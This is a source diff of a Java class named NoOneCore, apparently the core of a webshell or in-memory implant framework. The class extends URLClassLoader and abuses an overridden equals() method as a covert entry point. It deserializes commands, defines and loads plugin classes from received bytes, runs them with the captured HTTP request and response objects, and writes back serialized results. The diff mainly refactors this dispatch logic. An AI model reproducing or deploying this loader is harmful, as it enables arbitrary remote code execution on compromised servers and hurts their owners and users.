@@ -1,8 +1,6 @@
 package com.reajason.noone.core;
 
 import java.io.*;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.*;
@@ -39,9 +37,9 @@ public class NoOneCore extends URLClassLoader {
     private static final int FAILURE = 1;
 
     // pluginName to pluginObject
-    public static final Map<String, Object> loadedPluginCache = new ConcurrentHashMap<String, Object>();
-    public static final Map<String, String> loadedPluginVersionCache = new ConcurrentHashMap<String, String>();
-    public static final Map<String, Object> globalCaches = new ConcurrentHashMap<String, Object>();
+    public static final Map<String, Object> loadedPluginCache = new ConcurrentHashMap<>();
+    public static final Map<String, String> loadedPluginVersionCache = new ConcurrentHashMap<>();
+    public static final Map<String, Object> globalCaches = new ConcurrentHashMap<>();
 
     private static volatile NoOneCore pluginClassLoader;
 
@@ -64,67 +62,75 @@ public class NoOneCore extends URLClassLoader {
         return pluginClassLoader;
     }
 
+    private Object req;
+    private Object res;
+
     @Override
     public boolean equals(Object obj) {
-        byte[] inputBytes = (byte[]) ((Object[]) obj)[0];
-        OutputStream outputStream = (OutputStream) ((Object[]) obj)[1];
-        if (inputBytes != null && outputStream != null) {
-            Map<String, Object> result = new LinkedHashMap<String, Object>();
-            result.put(CODE, SUCCESS);
-            Map<String, Object> args = new HashMap<String, Object>();
+        Object[] ctx = (Object[]) obj;
+        if (!(ctx[1] instanceof OutputStream)) {
+            req = ctx[0];
+            res = ctx[1];
+            return false;
+        }
+        byte[] inputBytes = (byte[]) ctx[0];
+        OutputStream outputStream = (OutputStream) ctx[1];
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put(CODE, SUCCESS);
+        Map<String, Object> args = new HashMap<>();
+        try {
+            args = deserialize(inputBytes);
+        } catch (Throwable e) {
+            result.put(CODE, FAILURE);
+            result.put(ERROR, getStackTraceAsString(new RuntimeException("args parsed failed, " + e.getMessage(), e)));
+        }
+        String action = (String) args.get(ACTION);
+        if (action != null) {
             try {
-                args = deserialize(inputBytes);
+                switch (action) {
+                    case ACTION_STATUS:
+                        result.putAll(getStatus());
+                        break;
+                    case ACTION_RUN:
+                        result.putAll(run(args));
+                        break;
+                    case ACTION_LOAD:
+                        Object loaded = load(args, result);
+                        result.put(DATA, loaded != null);
+                        break;
+                    case ACTION_CLEAN:
+                        for (Object service : globalCaches.values()) {
+                            try {
+                                Map<String, Object> shutdownCtx = new HashMap<>();
+                                shutdownCtx.put("op", "shutdown");
+                                service.equals(shutdownCtx);
+                            } catch (Throwable ignored) {
+                            }
+                        }
+                        globalCaches.clear();
+                        loadedPluginCache.clear();
+                        loadedPluginVersionCache.clear();
+                        pluginClassLoader = null;
+                        break;
+                    default:
+                        result.put(CODE, FAILURE);
+                        result.put(ERROR, "action [" + action + "] not supported");
+                        break;
+                }
             } catch (Throwable e) {
                 result.put(CODE, FAILURE);
-                result.put(ERROR, getStackTraceAsString(new RuntimeException("args parsed failed, " + e.getMessage(), e)));
-            }
-            String action = (String) args.get(ACTION);
-            if (action != null) {
-                try {
-                    switch (action) {
-                        case ACTION_STATUS:
-                            result.putAll(getStatus());
-                            break;
-                        case ACTION_RUN:
-                            result.putAll(run(args));
-                            break;
-                        case ACTION_LOAD:
-                            Object loaded = load(args, result);
-                            result.put(DATA, loaded != null);
-                            break;
-                        case ACTION_CLEAN:
-                            for (Object service : globalCaches.values()) {
-                                try {
-                                    Map<String, Object> shutdownCtx = new HashMap<String, Object>();
-                                    shutdownCtx.put("op", "shutdown");
-                                    service.equals(shutdownCtx);
-                                } catch (Throwable ignored) {
-                                }
-                            }
-                            globalCaches.clear();
-                            loadedPluginCache.clear();
-                            loadedPluginVersionCache.clear();
-                            pluginClassLoader = null;
-                            break;
-                        default:
-                            result.put(CODE, FAILURE);
-                            result.put(ERROR, "action [" + action + "] not supported");
-                            break;
-                    }
-                } catch (Throwable e) {
-                    result.put(CODE, FAILURE);
-                    result.put(ERROR, getStackTraceAsString(new RuntimeException("action [" + action + "] run failed, " + e.getMessage(), e)));
-                }
-            }
-            try {
-                byte[] bytes = serialize(result);
-                outputStream.write(bytes, 0, bytes.length);
-                outputStream.flush();
-                outputStream.close();
-            } catch (Throwable ignored) {
+                result.put(ERROR, getStackTraceAsString(new RuntimeException("action [" + action + "] run failed, " + e.getMessage(), e)));
             }
         }
-        return false;
+        try {
+            byte[] bytes = serialize(result);
+            outputStream.write(bytes, 0, bytes.length);
+            outputStream.flush();
+            outputStream.close();
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+        return true;
     }
 
     private Class<?> defineClass(String className, byte[] bytes) {
@@ -132,7 +138,7 @@ public class NoOneCore extends URLClassLoader {
     }
 
     public Map<String, Object> getStatus() {
-        Map<String, Object> result = new HashMap<String, Object>();
+        Map<String, Object> result = new HashMap<>();
         result.put(PLUGIN_CACHES, loadedPluginVersionCache);
         result.put(GLOBAL_CACHES, globalCaches.keySet());
         return result;
@@ -185,16 +191,18 @@ public class NoOneCore extends URLClassLoader {
 
 
     @SuppressWarnings("unchecked")
-    public Map<String, Object> run(Map<String, Object> args) throws Exception {
-        Map<String, Object> result = new HashMap<String, Object>();
+    public Map<String, Object> run(Map<String, Object> args) {
+        Map<String, Object> result = new HashMap<>();
         String plugin = (String) args.get(PLUGIN);
         Object pluginObj = loadedPluginCache.get(plugin);
         Map<String, Object> map = (Map<String, Object>) args.get(ARGS);
         if (map == null) {
-            map = new HashMap<String, Object>();
+            map = new HashMap<>();
         }
         map.put(PLUGIN_CACHES, loadedPluginCache);
         map.put(GLOBAL_CACHES, globalCaches);
+        map.put("request", req);
+        map.put("response", res);
         pluginObj.equals(map);
         result.put(DATA, map.get("result"));
         result.put(CLASS_RUN, true);
@@ -221,59 +229,9 @@ public class NoOneCore extends URLClassLoader {
         return baos.toByteArray();
     }
 
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field field = getField(obj, fieldName);
-        field.setAccessible(true);
-        return field.get(obj);
-    }
-
-    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
-        Class<?> clazz = obj.getClass();
-        while (clazz != null) {
-            try {
-                Field field = clazz.getDeclaredField(fieldName);
-                field.setAccessible(true);
-                return field;
-            } catch (NoSuchFieldException e) {
-                clazz = clazz.getSuperclass();
-            }
-        }
-        throw new NoSuchFieldException(fieldName);
-    }
-
-    public static Object invokeMethod(Object obj, String methodName) {
-        return invokeMethod(obj, methodName, null, null);
-    }
-
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
-        try {
-            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
-            Method method = null;
-            while (clazz != null && method == null) {
-                try {
-                    if (paramClazz == null) {
-                        method = clazz.getDeclaredMethod(methodName);
-                    } else {
-                        method = clazz.getDeclaredMethod(methodName, paramClazz);
-                    }
-                } catch (NoSuchMethodException e) {
-                    clazz = clazz.getSuperclass();
-                }
-            }
-            if (method == null) {
-                throw new NoSuchMethodException("Method not found: " + methodName);
-            }
-
-            method.setAccessible(true);
-            return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (Exception e) {
-            throw new RuntimeException("Error invoking method: " + methodName, e);
-        }
-    }
-
     private boolean asBoolean(Object value) {
         if (value instanceof Boolean) {
-            return (Boolean)value;
+            return (Boolean) value;
         }
         return Boolean.parseBoolean(asString(value));
     }
@@ -380,7 +338,7 @@ public class NoOneCore extends URLClassLoader {
 
     private Map<String, Object> readMap(DataInputStream dis) throws IOException {
         int size = dis.readInt();
-        Map<String, Object> map = new HashMap<String, Object>(size);
+        Map<String, Object> map = new HashMap<>(size);
         for (int i = 0; i < size; i++) {
             String key = dis.readUTF();
             Object value = readObject(dis);
@@ -411,14 +369,14 @@ public class NoOneCore extends URLClassLoader {
                 return bytes;
             case SET:
                 int setSize = dis.readInt();
-                Set<Object> set = new LinkedHashSet<Object>(setSize);
+                Set<Object> set = new LinkedHashSet<>(setSize);
                 for (int i = 0; i < setSize; i++) {
                     set.add(readObject(dis));
                 }
                 return set;
             case LIST:
                 int listSize = dis.readInt();
-                List<Object> list = new ArrayList<Object>(listSize);
+                List<Object> list = new ArrayList<>(listSize);
                 for (int i = 0; i < listSize; i++) {
                     list.add(readObject(dis));
                 }
